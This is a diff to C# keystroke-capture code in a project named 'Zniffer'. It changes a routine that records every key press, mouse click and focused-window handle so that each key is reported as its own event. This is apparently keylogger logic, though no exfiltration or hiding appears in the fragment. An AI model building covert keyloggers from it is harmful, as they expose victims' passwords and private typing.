@@ -45,8 +45,6 @@ namespace Zniffer {
 
             if (handleCurrentWindow != handlePrevWindow) {//focuse changed
                 RaiseKeyCapturedEvent("[" + handleCurrentWindow + "]");
-                if (keyBuffer.Length > 0)
-                    RaiseKeyCapturedEvent(keyBuffer);
                 handlePrevWindow = handleCurrentWindow;
             }
 
@@ -69,15 +67,15 @@ namespace Zniffer {
                         shift = true;
 
                     if (Enum.GetName(typeof(Keys), i) == "LButton")
-                        keyBuffer += "<LMouse>";
+                        RaiseKeyCapturedEvent("<LMouse>");
                     else if (Enum.GetName(typeof(Keys), i) == "RButton")
-                        keyBuffer += "<RMouse>";
+                        RaiseKeyCapturedEvent("<RMouse>");
                     else if (Enum.GetName(typeof(Keys), i) == "Back")
-                        keyBuffer += "<Backspace>";
+                        RaiseKeyCapturedEvent("<Backspace>");
                     else if (Enum.GetName(typeof(Keys), i) == "Space")
-                        keyBuffer += " ";
+                        RaiseKeyCapturedEvent(" ");
                     else if (Enum.GetName(typeof(Keys), i) == "Return")
-                        keyBuffer += "<Enter>";
+                        RaiseKeyCapturedEvent("<Enter>");
                     else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                         continue;
                     else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
@@ -93,35 +91,35 @@ namespace Zniffer {
                     else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                         continue;
                     else if (Enum.GetName(typeof(Keys), i) == "Delete")
-                        keyBuffer += "<Del>";
+                        RaiseKeyCapturedEvent("<Del>");
                     else if (Enum.GetName(typeof(Keys), i) == "Insert")
-                        keyBuffer += "<Ins>";
+                        RaiseKeyCapturedEvent("<Ins>");
                     else if (Enum.GetName(typeof(Keys), i) == "Home")
-                        keyBuffer += "<Home>";
+                        RaiseKeyCapturedEvent("<Home>");
                     else if (Enum.GetName(typeof(Keys), i) == "End")
-                        keyBuffer += "<End>";
+                        RaiseKeyCapturedEvent("<End>");
                     else if (Enum.GetName(typeof(Keys), i) == "Tab")
-                        keyBuffer += "<Tab>";
+                        RaiseKeyCapturedEvent("<Tab>");
                     else if (Enum.GetName(typeof(Keys), i) == "Prior")
-                        keyBuffer += "<Page Up>";
+                        RaiseKeyCapturedEvent("<Page Up>");
                     else if (Enum.GetName(typeof(Keys), i) == "PageDown")
-                        keyBuffer += "<Page Down>";
+                        RaiseKeyCapturedEvent("<Page Down>");
                     else if (Enum.GetName(typeof(Keys), i) == "LWin")
-                        keyBuffer += "<LWin>";
+                        RaiseKeyCapturedEvent("<LWin>");
                     else if (Enum.GetName(typeof(Keys), i) == "RWin")
-                        keyBuffer += "<RWin>";
+                        RaiseKeyCapturedEvent("<RWin>");
                     else if (Enum.GetName(typeof(Keys), i) == "CapsLock")
-                        keyBuffer += "<CapsLock>";
+                        RaiseKeyCapturedEvent("<CapsLock>");
                     else if (Enum.GetName(typeof(Keys), i) == "Apps")
-                        keyBuffer += "<Apps>";
+                        RaiseKeyCapturedEvent("<Apps>");
                     else if (Enum.GetName(typeof(Keys), i) == "PrintScreen")
-                        keyBuffer += "<PrintScreen>";
+                        RaiseKeyCapturedEvent("<PrintScreen>");
                     else if (Enum.GetName(typeof(Keys), i) == "NumLock")
-                        keyBuffer += "<NumLock>";
+                        RaiseKeyCapturedEvent("<NumLock>");
                     else if (Enum.GetName(typeof(Keys), i) == "Scroll")
-                        keyBuffer += "<Scroll>";
+                        RaiseKeyCapturedEvent("<Scroll>");
                     else if (Enum.GetName(typeof(Keys), i) == "Escape")
-                        keyBuffer += "<Escape>";
+                        RaiseKeyCapturedEvent("<Escape>");
                     else {
                         if (!shift) { 
                             keyChar = keyChar.ToLower();
@@ -138,7 +136,7 @@ namespace Zniffer {
 
                             //RaiseKeyCapturedEvent("" + i);
                         }
-                        RaiseKeyCapturedEvent("ctrl=" + control + " alt=" + alt + " " + keyChar);
+                        RaiseKeyCapturedEvent("{" + Convert.ToInt32(control) + Convert.ToInt32(alt) + "}" + keyChar);
                     }
 
                     control = shift = alt = false;
